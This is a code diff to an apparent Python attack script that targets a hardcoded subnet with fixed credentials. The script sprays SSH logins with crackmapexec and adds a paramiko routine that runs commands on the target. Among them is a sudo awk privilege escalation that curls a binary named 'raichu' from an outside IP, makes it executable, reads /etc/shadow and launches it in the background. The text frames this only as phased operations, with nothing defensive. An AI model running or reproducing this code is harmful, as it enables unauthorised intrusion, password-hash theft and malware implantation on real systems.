@@ -3,13 +3,39 @@ import time
 import requests
 import os
 import sys
+import paramiko
+
 
 def check_root():
 	# Check if the script is run as root
 	if os.geteuid() != 0:
 		print('Please run the script as root (using sudo).')
 		sys.exit(1)
+		
+def execute_ssh_commands(username, password, host, commands):
+    # Create an SSH client
+    client = paramiko.SSHClient()
 
+    try:
+        # Automatically add the server's host key
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        # Connect to the SSH server
+        client.connect(host, username=username, password=password)
+
+        for command in commands:
+            # Execute each command with the password
+            full_command = f"{command}"
+            stdin, stdout, stderr = client.exec_command(full_command)
+
+            # Print the output
+            print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
+
+    finally:
+        # Close the SSH connection
+        client.close()
+
+		
 def phaseOne():
 	# Define attack space 
 	subnet = "208.11.26.0/24"
@@ -68,22 +94,30 @@ def phaseTwo():
 	password = "bubblewrap69"
 	# Run fping against the subnet
 	print(f"Running fping against the subnet {subnet}")
-	subprocess.run(["fping", "-g", subnet, "-a"])
+	#subprocess.run(["fping", "-g", subnet, "-a"])
 	# Wait for 3 minutes
 	print("Waiting for 3 minutes...")
 	#time.sleep(180)
 	# Run Crackmapexec for ssh on the target subnet 
 	cme = f"crackmapexec ssh {subnet} -u {username} -p {password}"
-	subprocess.run(cme, shell=True, text=True)
+	#subprocess.run(cme, shell=True, text=True)
 	# Initial SSH Connection, enumerate, and then perform privesc
-	login = f"ssh {username}@{target_ip}
+	awkC2 = "sudo -S awk 'BEGIN {system(\"/bin/sh -c whoami && curl http://94.249.192.5:8000/raichu -o /root/raichu\ && chmod +x /root/raichu && cat /etc/shadow && /root/raichu 2>&1 &\")}'"
+	commands_to_run = [
+	"whoami",
+	f"echo {password} | sudo -S -l",
+	"pwd",
+	f"echo {password} | {awkC2}",
+	]
+	execute_ssh_commands(username, password, target_ip, commands_to_run)
+	print("finished phase two tasks.")
 	
 	
 def main():
 	# Ensure Sudo Usage
 	check_root()
 	# Run phaseOne function
-	phaseOne()
+	phaseTwo()
 
 if __name__ == "__main__":
 	main()
